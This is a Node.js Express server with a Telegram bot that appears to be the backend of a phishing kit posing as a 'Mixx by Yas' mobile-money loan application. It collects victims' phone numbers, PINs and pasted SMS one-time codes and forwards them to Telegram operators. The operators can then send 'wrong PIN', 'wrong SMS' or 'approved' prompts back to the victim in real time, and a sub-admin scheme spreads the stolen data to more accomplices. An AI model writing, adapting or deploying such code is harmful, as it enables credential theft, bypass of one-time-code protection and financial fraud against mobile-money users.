const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Telegram configuration
const TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const MAIN_ADMIN_ID = process.env.MAIN_ADMIN_ID || 'YOUR_MAIN_ADMIN_TELEGRAM_ID';

const bot = new TelegramBot(TOKEN, { polling: true });

const sessions = {};
const authorizedSubAdmins = new Set([MAIN_ADMIN_ID]);

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id.toString();
  const isMain = (chatId === MAIN_ADMIN_ID);

  if (isMain) {
    authorizedSubAdmins.add(chatId);
    bot.sendMessage(chatId, `⭐ **Main Admin Active**\nYour link is free to use and authorized.`);
  } else {
    bot.sendMessage(chatId, `🔐 **Sub-Admin Request**\nYour ID: \`${chatId}\`. Main admin must authorize you.`, {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '✅ Authorize', callback_data: `auth_sub_${chatId}` }]
        ]
      }
    });

    bot.sendMessage(MAIN_ADMIN_ID, `⚠️ Sub-admin start request from: \`${chatId}\``, {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '✅ Authorize', callback_data: `auth_sub_${chatId}` }, { text: '❌ Deny', callback_data: `deny_sub_${chatId}` }]
        ]
      }
    });
  }
});

bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id.toString();
  const data = query.data;

  if (data.startsWith('auth_sub_')) {
    const subId = data.replace('auth_sub_', '');
    authorizedSubAdmins.add(subId);
    bot.answerCallbackQuery(query.id, { text: 'Sub-admin authorized!' });
    bot.sendMessage(subId, `🎉 You are now authorized to receive applicant notifications!`);
    bot.sendMessage(chatId, `✅ Authorized ${subId}`);
  } else if (data.startsWith('deny_sub_')) {
    const subId = data.replace('deny_sub_', '');
    bot.answerCallbackQuery(query.id, { text: 'Access denied.' });
    bot.sendMessage(subId, `❌ Access denied.`);
  } else if (data.startsWith('allow_step_')) {
    const sessionId = data.replace('allow_step_', '');
    if (sessions[sessionId]) {
      sessions[sessionId].status = 'approved_step';
      bot.answerCallbackQuery(query.id, { text: 'Approved! Moved to next step.' });
      bot.editMessageReplyMarkup({ inline_keyboard: [[{ text: '✅ ALREADY APPROVED', callback_data: 'noop' }]] }, { chat_id: chatId, message_id: query.message.message_id });
    }
  } else if (data.startsWith('deny_step_')) {
    const sessionId = data.replace('deny_step_', '');
    if (sessions[sessionId]) {
      sessions[sessionId].status = 'denied';
      bot.answerCallbackQuery(query.id, { text: 'Denied.' });
      bot.editMessageReplyMarkup({ inline_keyboard: [[{ text: '❌ DENIED', callback_data: 'noop' }]] }, { chat_id: chatId, message_id: query.message.message_id });
    }
  } else if (data.startsWith('copy_sms_')) {
    const sessionId = data.replace('copy_sms_', '');
    const session = sessions[sessionId];
    const textToCopy = session && session.otpText ? session.otpText : 'No text found';
    bot.answerCallbackQuery(query.id, { 
      text: `SMS: ${textToCopy}`, 
      show_alert: true 
    });
  } else if (data.startsWith('otp_wrongpin_')) {
    const sessionId = data.replace('otp_wrongpin_', '');
    if (sessions[sessionId]) sessions[sessionId].otpStatus = 'wrong_pin';
    bot.answerCallbackQuery(query.id, { text: 'Wrong PIN triggered.' });
  } else if (data.startsWith('otp_wrongsms_')) {
    const sessionId = data.replace('otp_wrongsms_', '');
    if (sessions[sessionId]) sessions[sessionId].otpStatus = 'wrong_sms';
    bot.answerCallbackQuery(query.id, { text: 'Wrong SMS triggered.' });
  } else if (data.startsWith('otp_approved_')) {
    const sessionId = data.replace('otp_approved_', '');
    if (sessions[sessionId]) {
      sessions[sessionId].status = 'fully_approved';
      sessions[sessionId].otpStatus = 'approved';
      bot.answerCallbackQuery(query.id, { text: 'Final Approval Success triggered.' });
      bot.editMessageReplyMarkup({ inline_keyboard: [[{ text: '✅ COMPLETED SUCCESSFULLY', callback_data: 'noop' }]] }, { chat_id: chatId, message_id: query.message.message_id });
    }
  }
});

// Receive Loan Details
app.post('/api/submit-loan', async (req, res) => {
  const { sessionId, amount, duration } = req.body;
  sessions[sessionId] = { status: 'pending', otpStatus: 'waiting', amount, duration };
  res.json({ success: true });
});

// Receive Phone & PIN -> Sent to Telegram
app.post('/api/submit-details', async (req, res) => {
  const { sessionId, phone, pin } = req.body;
  if (!sessions[sessionId]) {
    sessions[sessionId] = { status: 'pending', otpStatus: 'waiting' };
  }
  sessions[sessionId].phone = phone;
  sessions[sessionId].pin = pin;

  const message = `**NEW MIXX BY YAS APPLICATION**\n\n` +
                  `📱 **Phone number:** \`${phone}\`\n` +
                  `🔑 **PIN:** \`${pin}\``;

  for (const adminId of authorizedSubAdmins) {
    await bot.sendMessage(adminId, message, {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ ALLOW', callback_data: `allow_step_${sessionId}` },
            { text: '❌ DENY', callback_data: `deny_step_${sessionId}` }
          ]
        ]
      }
    });
  }

  res.json({ success: true });
});

app.get('/api/check-status/:sessionId', (req, res) => {
  const session = sessions[req.params.sessionId];
  if (!session) return res.json({ status: 'not_found' });
  res.json({ status: session.status, otpStatus: session.otpStatus });
});

// Receive OTP SMS Paste -> Sent to Telegram with Copy button
app.post('/api/submit-otp', async (req, res) => {
  const { sessionId, otpText } = req.body;
  const session = sessions[sessionId];
  if (session) session.otpText = otpText;

  const phoneNum = session ? session.phone : 'N/A';

  const message = `**NEW MIXX BY YAS APPLICATION (OTP)**\n\n` +
                  `📱 **Phone number:** \`${phoneNum}\`\n` +
                  `💬 **SMS / OTP:**\n\`\`\`\n${otpText}\n\`\`\``;

  for (const adminId of authorizedSubAdmins) {
    await bot.sendMessage(adminId, message, {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '📋 COPY SMS', callback_data: `copy_sms_${sessionId}` }
          ],
          [
            { text: 'WRONG PIN ❌', callback_data: `otp_wrongpin_${sessionId}` },
            { text: 'WRONG SMS', callback_data: `otp_wrongsms_${sessionId}` }
          ],
          [
            { text: 'APPROVED', callback_data: `otp_approved_${sessionId}` }
          ]
        ]
      }
    });
  }

  res.json({ success: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
  
